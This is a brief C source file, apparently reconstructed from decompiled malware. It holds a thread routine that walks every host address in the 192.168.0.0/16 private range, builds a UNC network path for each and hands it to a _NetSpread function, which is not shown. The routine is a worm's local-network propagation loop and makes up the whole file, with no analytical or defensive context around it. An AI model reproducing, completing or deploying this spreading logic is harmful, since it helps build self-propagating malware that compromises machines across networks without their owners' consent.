#include "data_globals.h"
#include <string.h>
#include <stdio.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI _L0cal_4(LPVOID Data)
{
    volatile struct _LocalCtx {
        char local_54[64];
        uint32_t local_14;
        uint32_t local_10;
    } ctx;

    LPCSTR param_1 = (LPCSTR)Data;

    for (ctx.local_10 = 0; ctx.local_10 < 0x100; ctx.local_10++)
    {
        for (ctx.local_14 = 0; ctx.local_14 < 0x100; ctx.local_14++)
        {
            memset(ctx.local_54, 0, sizeof(ctx.local_54));
            sprintf(ctx.local_54, "\\\\192.168.%d.%d", ctx.local_10, ctx.local_14);
            _NetSpread((uint32_t)ctx.local_54, param_1);
        }
    }
    return 0;
}
#pragma optimize("", on)
